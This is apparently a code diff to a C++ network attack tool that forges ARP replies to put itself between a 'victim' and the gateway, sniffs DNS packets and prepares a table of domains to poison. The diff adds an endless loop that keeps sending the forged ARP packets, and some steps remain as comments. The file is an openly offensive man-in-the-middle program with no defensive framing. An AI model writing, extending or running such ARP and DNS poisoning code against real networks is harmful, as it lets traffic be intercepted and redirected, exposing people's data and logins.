@@ -1,4 +1,6 @@
 #include <iostream>
+#include <unordered_map>
+#include <vector>
 
 #include <stdio.h>
 #include <string.h>
@@ -10,42 +12,73 @@
 #include "dns.h"
 
 void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet);
-void dnsCallback(const struct pcap_pkthdr *header, const unsigned char *packet);
 
 // get the interface name, ip of gateway and ip of victim
 // main program we need: interface name, ip of gateway, ip of victim
 // dns poison we need: domain to poison, what to poison too
 int main(int argc, const char *argv[]) {
-    // get this from the config file later
-    const char *interfaceName = "wlp59s0";
+    const char *interfaceName = "wlp59s0"; // get this from config file
+    std::unordered_map<std::string, std::string> domainsToPoison;
 
-    unsigned char attackerMac[ETH_ALEN] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
-    unsigned char victimMac[ETH_ALEN];
-    unsigned char gatewayMac[ETH_ALEN];
+    unsigned char attackerMac[ETH_ALEN] = {0x01, 0x02, 0x03,
+                                           0x04, 0x05, 0x06}; // get this from config file
+    unsigned char victimMac[ETH_ALEN];                        // get this from arp request
+    unsigned char gatewayMac[ETH_ALEN];                       // get this from arp request
 
     struct in_addr victimIp;
     struct in_addr gatewayIp;
     struct arp_header victimArp;
     struct arp_header gatewayArp;
 
-    memcpy(victimMac, attackerMac, 6);
-    memcpy(gatewayMac, attackerMac, 6);
+    NetworkEngine ipEngine(interfaceName);
 
-    // get the mac and ip addresses of the victim and the gateway
-    victimIp.s_addr = 0x010a000a;
-    gatewayIp.s_addr = 0x020a000a;
+    // start arp sniffing
 
-    // forge the arp packets as these should never change
+    // send arp request to get mac address of victim
+
+    // send arp request to get the mac address of gateway
+
+    // stop arp sniffing once victim and gateway macs are acquired
+
+    // start dns sniffing
+    ipEngine.LoopCallbacks.push_back(
+        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
+            struct iphdr *ip;
+            struct udphdr *udp;
+            dnshdr *dns;
+
+            int ipLen = 0;
+            int udpLen = 0;
+            int dnsLen = 0;
+
+            // get ip hdr size
+            ip = (iphdr *)(packet + 14);
+            ipLen = ip->ihl * 4;
+
+            // check to see if it is udp
+            if (ip->protocol != IPPROTO_UDP) {
+                return;
+            }
+
+            // get udp hdr and size
+            udp = (udphdr *)(packet + 14 + ipLen);
+            udpLen = UdpStack::UDP_HDR_LEN;
+
+            // check that it is a dns packet
+            if (ntohs(udp->source) != 53 && ntohs(udp->dest) != 53) {
+                return;
+            }
+        });
+    ipEngine.startSniff(NetworkEngine::IP_FILTER);
+
+    // start arp poisoning
     forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
     forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);
 
-    NetworkEngine ipEngine(interfaceName);
-
-    ipEngine.LoopCallbacks.push_back(dnsCallback);
-    ipEngine.startSniff(NetworkEngine::IP_FILTER);
-
-    ipEngine.sendArp(victimArp);
-    ipEngine.sendArp(gatewayArp);
+    while (true) {
+        ipEngine.sendArp(victimArp);
+        ipEngine.sendArp(gatewayArp);
+    }
 
     return 0;
 }
@@ -88,47 +121,4 @@ void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet) 
 
         printf("\n");
     }
-}
-
-/*
- * Simple callback that just displays some basic dns fields as a proof-of-concept
- */
-void dnsCallback(const struct pcap_pkthdr *header, const unsigned char *packet) {
-    iphdr *ip;
-    udphdr *udp;
-    dnshdr *dns;
-
-    int ipLen = 0;
-    int udpLen = 0;
-    int dnsLen = 0;
-
-    // get ip hdr size
-    ip = (iphdr *)(packet + 14);
-    ipLen = ip->ihl * 4;
-
-    // check to see if it is udp
-    if (ip->protocol != IPPROTO_UDP) {
-        return;
-    }
-
-    // get udp hdr and size
-    udp = (udphdr *)(packet + 14 + ipLen);
-    udpLen = UdpStack::UDP_HDR_LEN;
-
-    // check that it is a dns packet
-    if (ntohs(udp->source) != 53 && ntohs(udp->dest) != 53) {
-        return;
-    }
-
-    // get dns hdr and size
-    dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
-    dnsLen = ntohs(udp->len) - UdpStack::UDP_HDR_LEN;
-
-    printf("\n\ndns id: %u\n", ntohs(dns->id));
-    printf("query or reply: ");
-    dns->qr == 1 ? printf("response\n") : printf("query\n");
-    printf("number of questions: %u\n", ntohs(dns->qcount));
-    printf("number of answer records: %u\n", ntohs(dns->ancount));
-    printf("number of name servers: %u\n", ntohs(dns->nscount));
-    printf("number of additional records: %u\n\n", ntohs(dns->adcount));
 }
